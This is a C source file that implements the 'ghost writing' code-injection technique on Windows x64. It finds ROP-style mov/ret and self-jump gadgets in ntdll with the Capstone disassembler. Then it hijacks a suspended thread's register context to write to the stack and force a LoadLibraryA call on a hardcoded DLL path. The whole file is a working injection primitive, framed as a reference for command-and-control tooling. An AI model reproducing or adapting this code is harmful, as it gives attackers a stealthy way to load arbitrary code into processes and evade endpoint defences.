/*
 simple x64 implementation of the ghost writing code injection technique. note this is JUST FOR REFERENCE and won't 
 work in your sweet new c2 off the shelf. it also uses capstone. check out pinjectra for a more feature rich and stable version of this.
*/

#include "stdafx.h"
#include <Windows.h>
#include "include/capstone/capstone.h"

#pragma comment(lib, "capstone.lib")

static csh g_handle;
static x86_reg g_lside, g_rside;
static size_t JmpAddr = -1, MovAddr = -1, StackBase = -1;

void WaitForThreadAutoLock(HANDLE Thread, CONTEXT *PThreadContext, DWORD AutoLockTargetRIP)
{
	SetThreadContext(Thread, PThreadContext);

	do{
		ResumeThread(Thread);
		Sleep(30);
		SuspendThread(Thread);
		GetThreadContext(Thread, PThreadContext);
	} while (PThreadContext->Rip != AutoLockTargetRIP);
}

void SetContextRegister(CONTEXT *context, x86_reg reg, size_t value)
{
	switch (reg)
	{
	case X86_REG_RBX:
		context->Rbx = value;
		break;
	case X86_REG_RSI:
		context->Rsi = value;
		break;
	case X86_REG_RDI:
		context->Rdi = value;
		break;
	}
}

void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
{
	SetContextRegister(&context, g_rside, WriteWhat);
	SetContextRegister(&context, g_lside, WriteWhere);

	context.Rsp = StackBase;
	context.Rip = MovAddr;

	WaitForThreadAutoLock(hThread, &context, JmpAddr);
}

int _tmain(int argc, _TCHAR* argv[])
{
	char buf[2] = { 0xeb, 0xfe };
	FARPROC RtlExitUserThread = GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Sleep, 10000, CREATE_SUSPENDED, NULL);
	PUCHAR NtdllCode;
	ULONG NtdllCodeSize;
	HMODULE NtdllBase;
	size_t NumPOPs = 0;
	PIMAGE_NT_HEADERS64 NtPeHeaders;
	CONTEXT threadContext, workingThreadContext;

	// capstone stuff
	cs_insn *insn;
	size_t count;

	if (cs_open(CS_ARCH_X86, CS_MODE_64, &g_handle) != CS_ERR_OK)
		return -1;

	// skip junk data and enable instruction details
	cs_option(g_handle, CS_OPT_SKIPDATA, CS_OPT_ON);
	cs_option(g_handle, CS_OPT_DETAIL, CS_OPT_ON);

	NtdllBase = GetModuleHandleA("ntdll");
	NtdllCode = (PUCHAR)((ULONG)NtdllBase + 0x1000);
	NtPeHeaders = (PIMAGE_NT_HEADERS64)((ULONG)NtdllBase + ((IMAGE_DOS_HEADER*)NtdllBase)->e_lfanew);
	NtdllCodeSize = NtPeHeaders->OptionalHeader.SizeOfCode;

	printf("[!] Module base at %10x\n", NtdllBase);

	count = cs_disasm(g_handle, NtdllCode, NtdllCodeSize, NtdllCode, 0, &insn);
	if (count > 0){
		BOOL found = FALSE;
		for (size_t j = 0; j < count && !found; ++j){
			cs_insn *currin = &(insn[j]);
			if (strcmp(currin->mnemonic, "mov") == 0){
				//printf("0x%"PRIx64":\t%s\t\t%s\n", NtdllBase + currin->address, currin->mnemonic, currin->op_str);
				cs_detail *detail = currin->detail;
				if (detail->x86.op_count <= 1)
					continue;
				
				cs_x86_op *opl = &(detail->x86.operands[0]);
				cs_x86_op *opr = &(detail->x86.operands[1]);
				if (opl->type == X86_OP_MEM && opr->type == X86_OP_REG){
					// have the right things so far...check for register
					char *reg = cs_reg_name(g_handle, opr->reg);
					if ((opr->reg == X86_REG_RBX ||
						opr->reg == X86_REG_RSI ||
						opr->reg == X86_REG_RDI) &&
						opl->mem.disp == 0){

						// check where the closest RET is at

						// ensure memory access on lside is to a nonvolatile register that we need
						if (opl->mem.base != X86_REG_INVALID && (
							opl->mem.base == X86_REG_RBX ||
							opl->mem.base == X86_REG_RSI ||
							opl->mem.base == X86_REG_RDI) &&
							opl->mem.base != opr->reg){
							

							// now lets check for RET instructions nearby; up to 5 instructions ahead
							for (size_t m = 0; m < 5; ++m){
								cs_insn *next = &(insn[j + m]);
								if (strcmp(next->mnemonic, "ret") == 0){
									//printf("0x%"PRIx64":\t%s\t\t%s\n", NtdllBase + currin->address, currin->mnemonic, currin->op_str);
									printf("[!] Potential match\n");

									// rewind and dump
									for (size_t o = 0; o < 5; ++o){
										cs_insn *ret_next = &(insn[j + o]);
										if (strcmp(ret_next->mnemonic, "pop") == 0){
											NumPOPs++;
											break;
										}

										printf("0x%"PRIx64":\t%s\t\t%s\n", ret_next->address, ret_next->mnemonic, ret_next->op_str);
									}
									
									// TODO fix logic here
									MovAddr = currin->address;
									g_lside = opl->mem.base;
									g_rside = opr->reg;
									//found = TRUE;
									break;
								}
							}
						}
					}
				}
			}
		}
	}

	printf("NTDLL code base @ %08x (%d bytes)\n", NtdllCode, NtdllCodeSize);
	for (int i = 0; i < NtdllCodeSize; ++i){
		if ((NtdllCode[i] == 0xeb) && (NtdllCode[i+1] == 0xfe)){
			JmpAddr = (ULONG64)&NtdllCode[i];
			
			break;
		}
	}

	if (JmpAddr == -1 || MovAddr == -1){
		printf("[-] Unable to identify necessary gadgets!\n");
		return 1;
	}

	printf("[+] Found jump at %10x\n", JmpAddr);
	printf("[+] MOV at %10x\n", MovAddr);

	// now we're ready to begin
	threadContext.ContextFlags = CONTEXT_FULL;
	workingThreadContext.ContextFlags = CONTEXT_FULL;

	GetThreadContext(hThread, &threadContext);
	GetThreadContext(hThread, &workingThreadContext);

	// set dwBase; we're allocating ourselves 8 qwords
	StackBase = workingThreadContext.Rsp - (8 * sizeof(size_t));

	// write JMP$ as our return; note the 0x28 hack is due to the chosen gadget having an add RSP, 0x28 and i'm too lazy right now to fix it :P
	// consider it lazy skid killer
	WriteQword(workingThreadContext, hThread, JmpAddr, StackBase + 0x28);

	// write address of LoadLibraryA to the stack 
	WriteQword(workingThreadContext, hThread, LoadLibraryA, StackBase + 0x30);

	// now write our DLL string path (c:\users\public\b)
	WriteQword(workingThreadContext, hThread, 0x73726573755c3a63, StackBase + 0x40);
	WriteQword(workingThreadContext, hThread, 0x5c63696c6275705c, StackBase + 0x48);
	WriteQword(workingThreadContext, hThread, 0x0000000000000062, StackBase + 0x50);

	// write a JMP$ after the LoadLibrary call so we can capture the return and restore thread execution
	WriteQword(workingThreadContext, hThread, JmpAddr, StackBase + 0x38);

	// now we're ready to call into LoadLibraryA with our DLL path (which needs to be in RCX)
	// we'll manually do this call since we need to adjust RSP a bit
	SetContextRegister(&workingThreadContext, g_rside, JmpAddr);
	SetContextRegister(&workingThreadContext, g_lside, StackBase + 0x38);

	workingThreadContext.Rsp = StackBase + 0x8;
	workingThreadContext.Rip = MovAddr;
	workingThreadContext.Rcx = StackBase + 0x40;

	WaitForThreadAutoLock(hThread, &workingThreadContext, JmpAddr);

	// restore thread execution, or don't...
	SetThreadContext(hThread, &threadContext);
	ResumeThread(hThread);

	cs_close(&g_handle);
	return 0;
}